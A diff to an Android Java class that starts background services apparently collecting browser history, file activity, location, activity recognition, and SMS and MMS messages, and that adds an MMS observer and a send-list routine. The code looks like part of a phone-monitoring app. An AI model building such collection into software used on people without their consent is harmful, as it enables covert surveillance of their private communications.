@@ -4,8 +4,10 @@ import android.content.Context;
 import android.content.Intent;
 
 import com.inet.android.history.LinkService;
+import com.inet.android.list.TurnSendList;
 import com.inet.android.location.LocationTracker;
 import com.inet.android.location.RecognitionDevService;
+import com.inet.android.sms.MMSObserver;
 import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.utils.Logging;
 
@@ -18,17 +20,28 @@ public class ServiceControl {
 
 	public static void runService(Context mContext) {
 		Logging.doLog(LOG_TAG, "start services", "start services");
-
+		
+		//------------start brouser--------------------
 		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
 		mContext.startService(linkServiceIntent);
-		Intent fileServiceIntent = new Intent(mContext, FileObserverService.class);
+		
+		//------------start file observer--------------------
+		Intent fileServiceIntent = new Intent(mContext,
+				FileObserverService.class);
 		mContext.startService(fileServiceIntent);
+		
+		//------------start location--------------------
 		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
 		mContext.startService(locServiceIntent);
+		
+		//------------start recognition--------------------
 		Intent recognitionServiceIntent = new Intent(mContext,
 				RecognitionDevService.class);
 		mContext.startService(recognitionServiceIntent);
+		
+		//------------register sms&mms observer--------------------
 		SMSBroadcastReceiver.regSmsObserver(mContext);
+		MMSObserver.regMMSObserver(mContext);
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
 
@@ -43,6 +56,10 @@ public class ServiceControl {
 		Intent recognitionServiceIntent = new Intent(mContext,
 				RecognitionDevService.class);
 		mContext.startService(recognitionServiceIntent);
+	}
+
+	public static void runTurnList(Context mContext) {
+		TurnSendList.startGetList(mContext);
 	}
 
 	public static void stopLink(Context mContext) {
